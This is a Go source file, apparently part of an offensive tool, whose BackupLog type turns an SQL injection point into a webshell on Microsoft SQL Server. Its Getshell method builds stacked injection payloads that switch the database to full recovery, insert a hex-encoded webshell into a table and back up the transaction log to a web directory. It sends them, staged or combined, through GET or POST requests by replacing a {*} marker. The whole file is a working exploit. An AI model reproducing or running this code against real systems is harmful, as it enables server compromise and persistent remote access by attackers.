package utils

import (
	"fmt"
	"strings"
)

type BackupLog struct {
	baseUrl  string
	method   string
	proxyUrl string
	headers  []string
	webshell string
	postData string
	timeout  int
	combine  bool
}

func (bl *BackupLog) Init(baseUrl string, method string, proxyUrl string, headers []string, webshell string, postData string, timeout int, combine bool) {
	bl.baseUrl = baseUrl
	bl.method = method
	bl.proxyUrl = proxyUrl
	if method != "POST" && method != "GET" {
		panic("method must be POST or GET")
	}
	//for _, header := range headers {
	//	kv := strings.Split(header, ":")
	//	if len(kv) != 2 {
	//		continue
	//	}
	//	bl.headers.Add(kv[0], kv[1])
	//}
	bl.headers = headers
	bl.webshell = webshell
	bl.postData = postData
	if timeout == 0 {
		bl.timeout = 30
	}
	bl.combine = combine
}

func (bl *BackupLog) Getshell(dbname string, backupdir string) {
	tempStr := generateRandomString(5)
	payload_stage1 := payloadEncode(fmt.Sprintf(";alter database [%s] set recovery full--", dbname))
	payload_stage2 := payloadEncode(fmt.Sprintf(";backup database [%s] to disk='%s' with init--", dbname, tempStr))
	payload_DropTable := payloadEncode(fmt.Sprintf(";drop table [%s]--", tempStr))
	payload_stage3 := payloadEncode(fmt.Sprintf(";create table [%s]([a] image)--", tempStr))
	payload_stage4 := payloadEncode(fmt.Sprintf(";backup log [%s] to disk='%s' with init--", dbname, tempStr))
	payload_stage5 := payloadEncode(fmt.Sprintf(";insert into [%s]([a]) values(%s)--", tempStr, fmt.Sprintf("0x%x", bl.webshell)))
	payload_stage6 := payloadEncode(fmt.Sprintf(";backup log [%s] to disk='%s' with init--", dbname, backupdir))
	payload_stage7 := payloadEncode(fmt.Sprintf(";backup log [%s] to disk='%s' with init--", dbname, tempStr))
	payload_combine := payloadEncode(fmt.Sprintf(";alter database [%s] set recovery full;backup database [%s] to disk='%s' with init;drop table [%s];create table [%s]([a] image);backup log [%s] to disk='%s' with init;insert into [%s]([a]) values(%s);backup log [%s] to disk='%s' with init;drop table [%s];backup log [%s] to disk='%s' with init--",
		dbname, dbname, tempStr, tempStr, tempStr, dbname, tempStr, tempStr, fmt.Sprintf("0x%x", bl.webshell), dbname, backupdir, tempStr, dbname, tempStr))
	if bl.combine {
		switch bl.method {
		case "POST":
			if bl.postData == "" {
				panic("postData cannot be empty while using POST method.")
			}
			if !strings.Contains(bl.postData, "{*}") && !strings.Contains(bl.baseUrl, "{*}") {
				panic("postData or baseUrl should contain a {*} mark.")
			}
			println("sending payload.")
			bl.post(payload_combine)
			break
		case "GET":
			if !strings.Contains(bl.baseUrl, "{*}") {
				panic("baseUrl should contain a {*} mark.")
			}
			println("sending payload.")
			bl.get(payload_combine)

			break
		}
	} else {
		switch bl.method {
		case "POST":
			if bl.postData == "" {
				panic("postData cannot be empty while using POST method.")
			}
			if !strings.Contains(bl.postData, "{*}") && !strings.Contains(bl.baseUrl, "{*}") {
				panic("postData or baseUrl should contain a {*} mark.")
			}
			println("sending payload.")
			bl.post(payload_stage1)
			bl.post(payload_stage2)
			bl.post(payload_DropTable)
			bl.post(payload_stage3)
			bl.post(payload_stage4)
			bl.post(payload_stage5)
			bl.post(payload_stage6)
			bl.post(payload_DropTable)
			bl.post(payload_stage7)
			break
		case "GET":
			if !strings.Contains(bl.baseUrl, "{*}") {
				panic("baseUrl should contain a {*} mark.")
			}
			println("sending payload.")
			bl.get(payload_stage1)
			bl.get(payload_stage2)
			bl.get(payload_DropTable)
			bl.get(payload_stage3)
			bl.get(payload_stage4)
			bl.get(payload_stage5)
			bl.get(payload_stage6)
			bl.get(payload_DropTable)
			bl.get(payload_stage7)
			break
		}
	}

}

func (bl *BackupLog) post(payload string) {
	HttpPost(
		strings.Replace(bl.baseUrl, "{*}", payload, -1),
		strings.Replace(bl.postData, "{*}", payload, -1),
		bl.headers,
		bl.proxyUrl,
		bl.timeout,
	)
}

func (bl *BackupLog) get(payload string) {
	HttpGet(
		strings.Replace(bl.baseUrl, "{*}", payload, -1),
		bl.headers,
		bl.proxyUrl,
		bl.timeout,
	)
}
